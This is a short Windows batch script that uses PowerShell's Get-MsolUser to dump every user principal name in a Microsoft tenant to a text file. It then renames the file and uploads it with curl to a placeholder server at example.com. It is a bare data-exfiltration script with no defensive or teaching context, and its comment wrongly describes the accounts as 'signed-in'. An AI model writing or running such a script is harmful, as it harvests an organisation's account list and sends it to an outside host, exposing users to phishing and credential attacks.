@echo off
setlocal

:: Call PowerShell to get signed-in Microsoft accounts and write to a .txt file
powershell -Command "Get-MsolUser -All | Select-Object UserPrincipalName | Out-File -FilePath 'accounts.txt'"

:: Rename the .txt file
ren accounts.txt renamed_accounts.txt

:: Define the server URL and file path
set serverUrl=http://example.com/upload
set filePath=%cd%\renamed_accounts.txt

:: Use curl to send the file to the server
curl -X POST %serverUrl% -F "file=@%filePath%"

endlocal
pause